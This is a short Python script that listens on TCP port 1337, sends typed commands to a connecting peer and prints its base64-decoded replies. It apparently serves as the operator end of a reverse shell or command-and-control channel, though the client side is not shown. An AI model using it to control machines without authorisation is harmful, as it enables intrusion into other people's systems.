import socket
import base64

PORT = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", PORT))
s.listen()

conn, addr = s.accept()

print(f"{addr} connected.")

with conn:
    while True:
        try:
            command = input(">")
            command = bytes(command, "utf-8")
            conn.sendall(command)
            reply = conn.recv(1024)
            reply = base64.b64decode(reply)
            print(reply)
        except Exception as e:
            # print(e)
            break
